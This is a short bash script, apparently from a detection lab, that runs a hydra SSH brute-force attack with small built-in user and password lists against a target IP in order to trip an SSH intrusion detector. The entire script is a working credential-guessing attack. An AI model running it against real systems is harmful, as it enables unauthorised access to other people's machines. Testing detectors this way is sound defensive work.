#!/usr/bin/env bash
# Run from the ATTACKER VM.
# Usage: bash ssh_bruteforce.sh <target_ip>
# Requires: hydra

set -euo pipefail
TARGET="${1:?Usage: $0 <target_ip>}"

echo "[attacker] SSH brute force against $TARGET"
echo "[attacker] This will trigger the SSH detector within ~${2:-60}s"

# Generate a small password list
PASSLIST=$(mktemp)
cat > "$PASSLIST" <<'EOF'
password
123456
admin
tara
root
letmein
qwerty
tara123
jetson
ubuntu
EOF

# Generate a user list
USERLIST=$(mktemp)
cat > "$USERLIST" <<'EOF'
root
admin
tara
ubuntu
pi
user
EOF

# Launch hydra — rate-limited enough to be realistic but fast enough to trip threshold
# -t 4: 4 parallel connections
# -W 1: 1 second wait between attempts
hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -W 1 -s 22 ssh://"$TARGET"

rm -f "$PASSLIST" "$USERLIST"
echo "[attacker] Done. Check defender: tara-admin incidents -n 10"
